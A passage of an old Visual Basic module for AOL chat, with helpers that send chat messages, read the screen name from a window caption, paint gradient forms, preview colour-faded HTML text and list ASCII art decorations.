Dim abc As String, TxtLength As Long
TxtLength& = SendMessage(WinHandle&, WM_GETTEXTLENGTH, 0&, 0&)
abc$ = String(TxtLength&, 0&)
Call SendMessageByString(WinHandle&, WM_GETTEXT, TxtLength& + 1, abc$)
GetText$ = abc$
End Function
Public Sub ChatSend2(SendString As String, Optional SendAfterPlaceBack As Boolean = False)
'This Makes sure the box is clear will grab then place back the text that was in ther after your message was sent
'example:
'Call ChatSend2("blah")
If FindChatRoom& = 0& Then Exit Sub
        Dim RichText1 As Long, RichText2 As Long, TextOfRich As String
RichText1& = FindWindowEx(FindChatRoom&, 0&, "RICHCNTL", vbNullString)
RichText2& = FindWindowEx(FindChatRoom&, RichText1&, "RICHCNTL", vbNullString)
TextOfRich$ = GetText(RichText2&)
Call SendMessageByString(RichText2&, WM_CLEAR, 0&, 0&)
Call SendMessageByString(RichText2&, WM_SETTEXT, 0&, SendString$)
Call SendMessageLong(RichText2&, WM_CHAR, ENTER_KEY, 0&)
Call SendMessageByString(RichText2&, WM_SETTEXT, 0&, TextOfRich$)
If SendAfterPlaceBack = True Then Call SendMessageLong(RichText2&, WM_CHAR, ENTER_KEY, 0&)
End Sub

Public Function ListClickEvent()
'Have you ever wanted, on a listbox, that when a certain item is click, something
'happens, well, this is the coding for it
'Do not use this as in a module, but in the form, im just showing how its done.

'Private Sub List1_Click()
'If List1.List(List1.ListIndex) = "Source" Then
'MsgBox "You Click Source in List1"
'End If
'End Sub

End Function
Public Function GetCaption(WindowHandle As Long) As String
    Dim buffer As String, TextLength As Long
    TextLength& = GetWindowTextLength(WindowHandle&)
    buffer$ = String(TextLength&, 0&)
    Call GetWindowText(WindowHandle&, buffer$, TextLength& + 1)
    GetCaption$ = buffer$
End Function
Public Function GetUser() As String
    Dim AOL As Long, MDI As Long, welcome As Long
    Dim Child As Long, UserString As String
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDIClient", vbNullString)
    Child& = FindWindowEx(MDI&, 0&, "AOL Child", vbNullString)
    UserString$ = GetCaption(Child&)
    If InStr(UserString$, "Welcome, ") = 1 Then
        UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
        GetUser$ = UserString$
        Exit Function
    Else
        Do
            Child& = FindWindowEx(MDI&, Child&, "AOL Child", vbNullString)
            UserString$ = GetCaption(Child&)
            If InStr(UserString$, "Welcome, ") = 1 Then
                UserString$ = Mid$(UserString$, 10, (InStr(UserString$, "!") - 10))
                GetUser$ = UserString$
                Exit Function
            End If
        Loop Until Child& = 0&
    End If
    GetUser$ = ""
End Function
Public Function ChatRoomCount() As Long
'ex: Label1.caption=ChatRoomCount
    Dim AOL As Long, MDI As Long, rMail As Long, rList As Long
    Dim Count As Long
    AOL& = FindWindow("AOL Frame25", vbNullString)
    MDI& = FindWindowEx(AOL&, 0&, "MDICLIENT", vbNullString)
    rMail& = FindChatRoom
    rList& = FindWindowEx(rMail&, 0&, "_AOL_Listbox", vbNullString)
    Count& = SendMessage(rList&, LB_GETCOUNT, 0&, 0&)
    ChatRoomCount& = Count&
End Function

Public Function zMisc_Time()
'in a timer, enabled it as true, make interval as 1
'and where ever you want the time to show up...ex: label1.caption then do this:
'Label1.caption=Time
'final product...
'Private Sub Timer1_Timer()
'Label1.caption = Time
'End Sub
End Function

Public Function zMisc_AsciiLab()
'also make sure that ur listbox's and textbox's text is set to arial
'make 6 listbox's, 1 textbox(final product) and put the following coding in Form_Load

'For X = 160 To 255
'List1.AddItem Chr(X)
'Next X
'List2.AddItem " )°·.·´¯`·->"
'List2.AddItem " ]|I(¯¨`v^•×•·· ·"
'List2.AddItem " ^v(`(`-•  "
'List2.AddItem "- ––––•(-• "
'List2.AddItem "•-)•–––– - "
'List2.AddItem "((¯\ _¸,.-·´¨¯¨`·,¸_"
'List2.AddItem "(`·–•   "
'List2.AddItem "•–·´)"
'List2.AddItem "(¯`•¸·´¯) "
'List2.AddItem "(¯`·¸•´¯)"
'List2.AddItem "(¯`v^÷• "
'List2.AddItem "•÷^v´¯)"
'List2.AddItem "[]ðº°˜¨˜°ºð[]"
'List2.AddItem "_(¯`·._ "
'List2.AddItem "_.·´¯)_"
'List2.AddItem "¨˜°ºð"
'List2.AddItem "ðº°˜¨ "
'List2.AddItem "«›-¤•.„.·´ "
'List2.AddItem "`·.„.•¤­‹»"
'List2.AddItem "«·´º´·•[• "
'List2.AddItem "•]•·´º´·»"
'List2.AddItem "«------•}I|[ "
'List2.AddItem "]|I{•------»"
'List2.AddItem "«•·.¸¸.·´¯`[• "
'List2.AddItem "×,.·´¨'°÷·..§ "
'List2.AddItem "§.·´¨'°÷·..×"
'List2.AddItem "· ··•×•^v´¨¯)I|[    "
'List2.AddItem "·°¯`·•"
'List2.AddItem "•·´¯°·"
'List2.AddItem "•]´¯`·.¸¸.·•»"
'List2.AddItem "•^v^–["
'List2.AddItem "]–^v^•"
'List2.AddItem "•´¯¥¯`•"
'List2.AddItem "(`·±÷»"
'List2.AddItem "]||•·´)(` .¸"
'List2.AddItem "(`¨˜°º²³³™º˜"
'List2.AddItem "•·.·')"
'List2.AddItem "(`·.·•"
'List2.AddItem "•–[ "
'List2.AddItem "]–•"
'List2.AddItem "[ƒ]"
'List2.AddItem "]¦•¦["
'List2.AddItem "]!¡!["
'List2.AddItem "·!¦[·"
'List2.AddItem "·ï¡÷¡ï·"
'List2.AddItem "[`·.]"
'List2.AddItem "[.·´]"
'List2.AddItem "·]¦÷¦[·"
'List2.AddItem "-•( )•-"
'List2.AddItem ".·´`·.·´¯`·.›"
'List2.AddItem "‹.·´¯`·.·´`·."
'List2.AddItem "‹–…·´`·…–›"
'List2.AddItem "(·-¦§¦^—|[•"
'List2.AddItem "¯`·._.·• "
'List2.AddItem "(.•ˆ•…  "
'List2.AddItem "…•ˆ•.)"
'List2.AddItem "‹—•([ "
'List2.AddItem "[`‘‚‘°•.•°‘‚‘´]"
'List2.AddItem "])•—›"
'List2.AddItem "•´`·..í"
'List2.AddItem "ì..·´`•"
'List2.AddItem "•´`·.·´`• "
'List2.AddItem "`·.,¸¸,.·´¯ "
'List2.AddItem "¯`·.,¸¸,.·´"
'List2.AddItem "×÷·´¯`·.·•["
'List2.AddItem "]•·.·´¯`·÷×"
'List2.AddItem "/`·¸. ·· .¸·´\"
'List2.AddItem "(`·¸_¸.·´)"
'List2.AddItem "(`·-.¸¸.-·´)"
'List2.AddItem "]l·´¨ºðOOðº¨`·l[ "
'List2.AddItem "¸.´)(`·•||["
'List2.AddItem "]||•·´)(`.¸"
'List2.AddItem "‹—"
'List2.AddItem "‹¦[ ]¦›"
'List2.AddItem "´¯`×"
'List2.AddItem "‹¡Ì›–"
'List2.AddItem "•–(["
'List2.AddItem "])–•"
'List2.AddItem "[íÍ Íí]"
'List2.AddItem "]¦•¦["
'List2.AddItem "]¦•¦["
'List2.AddItem "]!¡!["
'List2.AddItem "]!¡!["
'List2.AddItem "·×· "
'List2.AddItem "·×·"
'List2.AddItem "·!¦[· "
'List2.AddItem "·]¦!·"
'List2.AddItem "·ï¡÷¡ï· "
'List2.AddItem "·ï¡÷¡ï·"
'List2.AddItem "•÷ì¡›"
'List2.AddItem "‹¬–•·["
'List2.AddItem "•··÷"
'List2.AddItem "·´¯`·­» "
'List2.AddItem "«­·´¯`·"
'List2.AddItem "··¤(`×[¤  "
'List2.AddItem "¤]×´)¤··"
'List2.AddItem "—¤÷(`[¤  "
'List2.AddItem "¤]´)÷¤—"
'List2.AddItem "—(•·÷["
'List2.AddItem "]÷·•)—"
'List2.AddItem "—÷[(`"
'List2.AddItem "´)]÷—"
'List2.AddItem "(¯`·._.• "
'List2.AddItem "•._.·´¯)"
'List2.AddItem "¨˜ˆ”°¹~·-.„¸"
'List2.AddItem "¸„.-·~¹°”ˆ˜¨"
'List2.AddItem ".-~·*'˜¨¯`·¸"
'List2.AddItem "¸·`¯¨˜'*·~-."
'List2.AddItem "-·~¹'°¨°'¹i|¡"
'List2.AddItem "¡|i¹'°¨°'¹~·-"
'List2.AddItem "¨˜ª· , ¸, ·ª˜¨"
'List2.AddItem "¸‚·ª˜¨˜ª· , ¸"
'List2.AddItem "‹v^•"
'List2.AddItem "•^v›"
'List2.AddItem "‹(`·"
'List2.AddItem "·´)›"
'List2.AddItem "(¸.·´)"
'List3.AddItem "A"
'List3.AddItem "B"
'List3.AddItem "C"
'List3.AddItem "D"
'List3.AddItem "E"
'List3.AddItem "F"
'List3.AddItem "G"
'List3.AddItem "H"
'List3.AddItem "I"
'List3.AddItem "J"
'List3.AddItem "K"
'List3.AddItem "L"
'List3.AddItem "M"
'List3.AddItem "N"
'List3.AddItem "O"
'List3.AddItem "P"
'List3.AddItem "Q"
'List3.AddItem "R"
'List3.AddItem "S"
'List3.AddItem "T"
'List3.AddItem "U"
'List3.AddItem "V"
'List3.AddItem "W"
'List3.AddItem "X"
'List3.AddItem "Y"
'List3.AddItem "Z"
'List4.AddItem "a"
'List4.AddItem "b"
'List4.AddItem "c"
'List4.AddItem "d"
'List4.AddItem "e"
'List4.AddItem "f"
'List4.AddItem "g"
'List4.AddItem "h"
'List4.AddItem "i"
'List4.AddItem "j"
'List4.AddItem "k"
'List4.AddItem "l"
'List4.AddItem "m"
'List4.AddItem "n"
'List4.AddItem "o"
'List4.AddItem "p"
'List4.AddItem "q"
'List4.AddItem "r"
'List4.AddItem "s"
'List4.AddItem "t"
'List4.AddItem "u"
'List4.AddItem "v"
'List4.AddItem "w"
'List4.AddItem "x"
'List4.AddItem "y"
'List4.AddItem "z"
'List5.AddItem ":)"
'List5.AddItem ":("
'List5.AddItem ";)"
'List5.AddItem ";("
'List5.AddItem ";P"
'List5.AddItem ":o"
'List5.AddItem ":o]"
'List5.AddItem ";-)"
'List5.AddItem ";-("
'List5.AddItem ";\"
'List5.AddItem ";/"
'List5.AddItem ":\"
'List5.AddItem ":\"
'List5.AddItem ":D"
'List5.AddItem ";O"
'List5.AddItem ":)~"
'List5.AddItem "=)"
'List5.AddItem "=("
'List5.AddItem "=O"
'List5.AddItem "=)~"
'List5.AddItem "=\"
'List5.AddItem "=/"
'List5.AddItem ">:)"
'List5.AddItem ">:("
'List5.AddItem ">:\"
'List5.AddItem ">:/"
'List5.AddItem ">:|"
'List5.AddItem ">:]"
'List5.AddItem ">:["
'List5.AddItem "=x"
'List5.AddItem ";x"
'List5.AddItem ":x"
'List5.AddItem "8)"
'List5.AddItem "8("
'List5.AddItem "8)~"
'List6.AddItem "0"
'List6.AddItem "1"
'List6.AddItem "2"
'List6.AddItem "3"
'List6.AddItem "4"
'List6.AddItem "5"
'List6.AddItem "6"
'List6.AddItem "7"
'List6.AddItem "8"
'List6.AddItem "9"
'List6.AddItem "10"
'now in the subs where List1,2,3,4,5,6 are Click You add This Stuff

'Private Sub List1_Click()
'Text1.text = Text1.text + List1.text
'End Sub

'Private Sub List2_Click()
'Text1.text = Text1.text + List2.text
'End Sub

'Private Sub List3_Click()
'Text1.text = Text1.text + List3.text
'End Sub

'Private Sub List4_Click()
'Text1.text = Text1.text + List4.text
'End Sub

'Private Sub List5_Click()
'Text1.text = Text1.text + List5.text
'End Sub

'Private Sub List6_Click()
'Text1.text = Text1.text +list6.text

'now where ever your going to have the Send Button Put This in it

'Call ChatScroll (Text1.text)
End Function

'********FOLLOWING BY MONK-E-GOD*********
'********EVERY SINGLE SUB MODIFIED BY SOURCE*********
Sub FormFade(FormX As Form, Colr1, Colr2)
'by monk-e-god (modified from a sub by MaRZ)
    B1 = GetRGB(Colr1).blue
    G1 = GetRGB(Colr1).Green
    R1 = GetRGB(Colr1).red
    B2 = GetRGB(Colr2).blue
    G2 = GetRGB(Colr2).Green
    R2 = GetRGB(Colr2).red
    
    On Error Resume Next
    Dim intLoop As Integer
    FormX.DrawStyle = vbInsideSolid
    FormX.DrawMode = vbCopyPen
    FormX.ScaleMode = vbPixels
    FormX.DrawWidth = 2
    FormX.ScaleHeight = 256
    For intLoop = 0 To 255
        FormX.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((B2 - B1) / 255 * intLoop) + B1), B
    Next intLoop
End Sub

Sub FadeForm(FormX As Form, Colr1, Colr2)
'by monk-e-god (modified from a sub by MaRZ)
    B1 = GetRGB(Colr1).blue
    G1 = GetRGB(Colr1).Green
    R1 = GetRGB(Colr1).red
    B2 = GetRGB(Colr2).blue
    G2 = GetRGB(Colr2).Green
    R2 = GetRGB(Colr2).red
    
    On Error Resume Next
    Dim intLoop As Integer
    FormX.DrawStyle = vbInsideSolid
    FormX.DrawMode = vbCopyPen
    FormX.ScaleMode = vbPixels
    FormX.DrawWidth = 2
    FormX.ScaleHeight = 256
    For intLoop = 0 To 255
        FormX.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(((R2 - R1) / 255 * intLoop) + R1, ((G2 - G1) / 255 * intLoop) + G1, ((B2 - B1) / 255 * intLoop) + B1), B
    Next intLoop
End Sub
Sub FadeFormBlue(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormBlue Me
'End Sub
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormGreen(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormGreen Me
'End Sub

On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(0, 255 - intLoop, 0), B
    Next intLoop
End Sub

Sub FadeFormGrey(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormGrey Me
'End Sub
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormPurple(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormPurple Me
'End Sub
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 255 - intLoop), B
    Next intLoop
End Sub

Sub FadeFormRed(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormRed Me
'End Sub
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 0, 0), B
    Next intLoop
End Sub

Sub FadeFormYellow(vForm As Form)
'Example:
'Private Sub Form_Paint()
'FadeFormYellow Me
'End Sub
    On Error Resume Next
    Dim intLoop As Integer
    vForm.DrawStyle = vbInsideSolid
    vForm.DrawMode = vbCopyPen
    vForm.ScaleMode = vbPixels
    vForm.DrawWidth = 2
    vForm.ScaleHeight = 256
    For intLoop = 0 To 255
        vForm.Line (0, intLoop)-(Screen.Width, intLoop - 1), RGB(255 - intLoop, 255 - intLoop, 0), B
    Next intLoop
End Sub
Sub FadePreview(PicB As PictureBox, ByVal FadedText As String)
'by aDRaMoLEk
FadedText$ = Replacer(FadedText$, Chr(13), "+chr13+")
osm = PicB.ScaleMode
PicB.ScaleMode = 3
textoffx = 0: textoffy = 0
StartX = 2: StartY = 0
PicB.Font = "Arial": PicB.FontSize = 10
PicB.FontBold = False: PicB.FontItalic = False: PicB.FontUnderline = False: PicB.FontStrikethru = False
PicB.AutoRedraw = True: PicB.ForeColor = 0&: PicB.Cls
For x = 1 To Len(FadedText$)
  c$ = Mid$(FadedText$, x, 1)
  If c$ = "<" Then
    TagStart = x + 1
    TagEnd = InStr(x + 1, FadedText$, ">") - 1
    t$ = LCase$(Mid$(FadedText$, TagStart, (TagEnd - TagStart) + 1))
    x = TagEnd + 1
    Select Case t$
      Case "u"
        PicB.FontUnderline = True
      Case "/u"
        PicB.FontUnderline = False
      Case "s"
        PicB.FontStrikethru = True
      Case "/s"
        PicB.FontStrikethru = False
      Case "b"    'start bold
        PicB.FontBold = True
      Case "/b"   'stop bold
        PicB.FontBold = False
      Case "i"    'start italic
        PicB.FontItalic = True
      Case "/i"   'stop italic
        PicB.FontItalic = False
      Case "sup"  'start superscript
        textoffy = -1
      Case "/sup" 'end superscript
        textoffy = 0
      Case "sub"  'start subscript
        textoffy = 1
      Case "/sub" 'end subscript
        textoffy = 0
      Case Else
        If Left$(t$, 10) = "font color" Then 'change font color
          ColorStart = InStr(t$, "#")
          ColorString$ = Mid$(t$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          PicB.ForeColor = RGB(RV, GV, BV)
        End If
        If Left$(t$, 9) = "font face" Then 'added by monk-e-god
            fontstart% = InStr(t$, Chr(34))
            dafont$ = Right(t$, Len(t$) - fontstart%)
            PicB.Font = dafont$
        End If
    End Select
  Else  'normal text
    If c$ = "+" And Mid(FadedText$, x, 7) = "+chr13+" Then ' added by monk-e-god
        StartY = StartY + 16
        textoffx = 0
        x = x + 6
    Else
        PicB.CurrentY = StartY + textoffy
        PicB.CurrentX = StartX + textoffx
        PicB.Print c$
        textoffx = textoffx + PicB.TextWidth(c$)
    End If
  End If
Next x
PicB.ScaleMode = osm
End Sub

Function GetRGB(ByVal CVal As Long) As COLORRGB
  GetRGB.blue = Int(CVal / 65536)
  GetRGB.Green = Int((CVal - (65536 * GetRGB.blue)) / 256)
  GetRGB.red = CVal - (65536 * GetRGB.blue + 256 * GetRGB.Green)
End Function
Sub FadePreview2(RichTB As Control, ByVal FadedText As String)
'Modified by monk-e-god for use in a RichTextBox

'NOTE: RichTB must be a RichTextBox.
'NOTE: You cannot preview wavy fades with this sub.
Dim StartPlace%
StartPlace% = 0
RichTB.SelStart = StartPlace%
RichTB.Font = "Arial": RichTB.SelFontSize = 10
RichTB.SelBold = False: RichTB.SelItalic = False: RichTB.SelUnderline = False: RichTB.SelStrikeThru = False
RichTB.SelColor = 0&: RichTB.text = ""
For x = 1 To Len(FadedText$)
  c$ = Mid$(FadedText$, x, 1)
  RichTB.SelStart = StartPlace%
  RichTB.SelLength = 1
  If c$ = "<" Then
    TagStart = x + 1
    TagEnd = InStr(x + 1, FadedText$, ">") - 1
    t$ = LCase$(Mid$(FadedText$, TagStart, (TagEnd - TagStart) + 1))
    x = TagEnd + 1
    RichTB.SelStart = StartPlace%
    RichTB.SelLength = 1
    Select Case t$
      Case "u"
        RichTB.SelUnderline = True
      Case "/u"
        RichTB.SelUnderline = False
      Case "s"
        RichTB.SelStrikeThru = True
      Case "/s"
        RichTB.SelStrikeThru = False
      Case "b"    'start bold
        RichTB.SelBold = True
      Case "/b"   'stop bold
        RichTB.SelBold = False
      Case "i"    'start italic
        RichTB.SelItalic = True
      Case "/i"   'stop italic
        RichTB.SelItalic = False
      
      Case Else
        If Left$(t$, 10) = "font color" Then 'change font color
          ColorStart = InStr(t$, "#")
          ColorString$ = Mid$(t$, ColorStart + 1, 6)
          RedString$ = Left$(ColorString$, 2)
          GreenString$ = Mid$(ColorString$, 3, 2)
          BlueString$ = Right$(ColorString$, 2)
          RV = Hex2Dec!(RedString$)
          GV = Hex2Dec!(GreenString$)
          BV = Hex2Dec!(BlueString$)
          RichTB.SelStart = StartPlace%
          RichTB.SelColor = RGB(RV, GV, BV)
        End If
        If Left$(t$, 9) = "font face" Then
            fontstart% = InStr(t$, Chr(34))
            dafont$ = Right(t$, Len(t$) - fontstart%)
            RichTB.SelStart = StartPlace%
            RichTB.SelFontName = dafont$
        End If
    End Select
  Else  'normal text
    RichTB.SelText = RichTB.SelText + c$
    StartPlace% = StartPlace% + 1
    RichTB.SelStart = StartPlace%
  End If
Next x
End Sub

Function Hex2Dec!(ByVal strHex$)
'by aDRaMoLEk
  If Len(strHex$) > 8 Then strHex$ = Right$(strHex$, 8)
  Hex2Dec = 0
  For x = Len(strHex$) To 1 Step -1
    CurCharVal = GETVAL(Mid$(UCase$(strHex$), x, 1))
    Hex2Dec = Hex2Dec + CurCharVal * 16 ^ (Len(strHex$) - x)
  Next x
End Function

Function GETVAL%(ByVal strLetter$)
'by aDRaMoLEk
  Select Case strLetter$
    Case "0"
      GETVAL = 0
    Case "1"
      GETVAL = 1
    Case "2"
      GETVAL = 2
    Case "3"
      GETVAL = 3
    Case "4"
      GETVAL = 4
    Case "5"
      GETVAL = 5
    Case "6"
      GETVAL = 6
    Case "7"
      GETVAL = 7
    Case "8"
      GETVAL = 8
    Case "9"
      GETVAL = 9
    Case "A"
      GETVAL = 10
    Case "B"
      GETVAL = 11
    Case "C"
      GETVAL = 12
    Case "D"
      GETVAL = 13
    Case "E"
      GETVAL = 14
    Case "F"
      GETVAL = 15
  End Select
End Function

Function CLRBars(RedBar As Control, GreenBar As Control, BlueBar As Control)
'This gets a color from 3 scroll bars
CLRBars = RGB(RedBar.Value, GreenBar.Value, BlueBar.Value)

'Put this in the scroll event of the
'3 scroll bars RedScroll1, GreenScroll1,
'& BlueScroll1.  It changes the backcolor
'of ColorLbl when you scroll the bars
'ColorLbl.BackColor = CLRBars(RedScroll1, GreenScroll1, BlueScroll1)

End Function

Function FadeByColor10(Colr1, Colr2, Colr3, Colr4, Colr5, Colr6, Colr7, Colr8, Colr9, Colr10, TheText$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)
dacolor6$ = RGBtoHEX(Colr6)
dacolor7$ = RGBtoHEX(Colr7)
dacolor8$ = RGBtoHEX(Colr8)
dacolor9$ = RGBtoHEX(Colr9)
dacolor10$ = RGBtoHEX(Colr10)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))
rednum6% = Val("&H" + Right(dacolor6$, 2))
greennum6% = Val("&H" + Mid(dacolor6$, 3, 2))
bluenum6% = Val("&H" + Left(dacolor6$, 2))
rednum7% = Val("&H" + Right(dacolor7$, 2))
greennum7% = Val("&H" + Mid(dacolor7$, 3, 2))
bluenum7% = Val("&H" + Left(dacolor7$, 2))
rednum8% = Val("&H" + Right(dacolor8$, 2))
greennum8% = Val("&H" + Mid(dacolor8$, 3, 2))
bluenum8% = Val("&H" + Left(dacolor8$, 2))
rednum9% = Val("&H" + Right(dacolor9$, 2))
greennum9% = Val("&H" + Mid(dacolor9$, 3, 2))
bluenum9% = Val("&H" + Left(dacolor9$, 2))
rednum10% = Val("&H" + Right(dacolor10$, 2))
greennum10% = Val("&H" + Mid(dacolor10$, 3, 2))
bluenum10% = Val("&H" + Left(dacolor10$, 2))


FadeByColor10 = FadeTenColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, rednum6%, greennum6%, bluenum6%, rednum7%, greennum7%, bluenum7%, rednum8%, greennum8%, bluenum8%, rednum9%, greennum9%, bluenum9%, rednum10%, greennum10%, bluenum10%, TheText, WavY)

End Function

Function FadeByColor2(Colr1, Colr2, TheText$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))

FadeByColor2 = FadeTwoColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, TheText, WavY)

End Function
Function FadeByColor3(Colr1, Colr2, Colr3, TheText$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))

FadeByColor3 = FadeThreeColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, TheText, WavY)

End Function
Function FadeByColor4(Colr1, Colr2, Colr3, Colr4, TheText$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))

FadeByColor4 = FadeFourColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, TheText, WavY)

End Function

Function FadeByColor5(Colr1, Colr2, Colr3, Colr4, Colr5, TheText$, WavY As Boolean)
'by monk-e-god
dacolor1$ = RGBtoHEX(Colr1)
dacolor2$ = RGBtoHEX(Colr2)
dacolor3$ = RGBtoHEX(Colr3)
dacolor4$ = RGBtoHEX(Colr4)
dacolor5$ = RGBtoHEX(Colr5)

rednum1% = Val("&H" + Right(dacolor1$, 2))
greennum1% = Val("&H" + Mid(dacolor1$, 3, 2))
bluenum1% = Val("&H" + Left(dacolor1$, 2))
rednum2% = Val("&H" + Right(dacolor2$, 2))
greennum2% = Val("&H" + Mid(dacolor2$, 3, 2))
bluenum2% = Val("&H" + Left(dacolor2$, 2))
rednum3% = Val("&H" + Right(dacolor3$, 2))
greennum3% = Val("&H" + Mid(dacolor3$, 3, 2))
bluenum3% = Val("&H" + Left(dacolor3$, 2))
rednum4% = Val("&H" + Right(dacolor4$, 2))
greennum4% = Val("&H" + Mid(dacolor4$, 3, 2))
bluenum4% = Val("&H" + Left(dacolor4$, 2))
rednum5% = Val("&H" + Right(dacolor5$, 2))
greennum5% = Val("&H" + Mid(dacolor5$, 3, 2))
bluenum5% = Val("&H" + Left(dacolor5$, 2))

FadeByColor5 = FadeFiveColor(rednum1%, greennum1%, bluenum1%, rednum2%, greennum2%, bluenum2%, rednum3%, greennum3%, bluenum3%, rednum4%, greennum4%, bluenum4%, rednum5%, greennum5%, bluenum5%, TheText, WavY)

End Function

Function FadeFiveColor(R1%, G1%, B1%, R2%, G2%, B2%, R3%, G3%, B3%, R4%, G4%, B4%, R5%, G5%, B5%, TheText$, WavY As Boolean)
'by monk-e-god
    Dim WaveState%
    Dim WaveHTML$
    WaveState = 0
    
    TextLen% = Len(TheText)
    
    Do: DoEvents
    fstlen% = fstlen% + 1: TextLen% = TextLen% - 1
    If TextLen% < 1 Then Exit Do
